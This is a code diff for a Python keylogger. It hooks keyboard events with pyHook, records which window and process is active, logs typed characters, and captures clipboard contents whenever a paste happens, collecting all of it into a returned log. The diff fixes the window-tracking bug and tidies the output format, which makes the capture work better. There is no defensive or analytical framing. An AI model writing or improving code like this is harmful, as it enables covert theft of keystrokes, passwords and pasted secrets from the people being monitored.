@@ -28,9 +28,10 @@ def get_current_process():
 def mykeystoke(event):
     global current_window
     if event.WindowName != current_window:
+        current_window = event.WindowName
         get_current_process()
     if 32 < event.Ascii < 127:
-        print(chr(event.Ascii), end=' ')
+        print(chr(event.Ascii), end='')
     else:
         if event.Key == 'V':
             win32clipboard.OpenClipboard()
@@ -38,12 +39,10 @@ def mykeystoke(event):
             win32clipboard.CloseClipboard()
             print(f'[PASTE] - {value}')
         else:
-            print(f'{event.Key}')
+            print(f' {event.Key} ')
     return True
 
-
 def run():
-
     hm = pyHook.HookManager()
     hm.KeyDown = mykeystoke
     hm.HookKeyboard()
@@ -52,7 +51,6 @@ def run():
     log = sys.stdout.getvalue()
     sys.stdout = save_stdout
     return log
-
 
 if __name__ == '__main__':
     print(run())
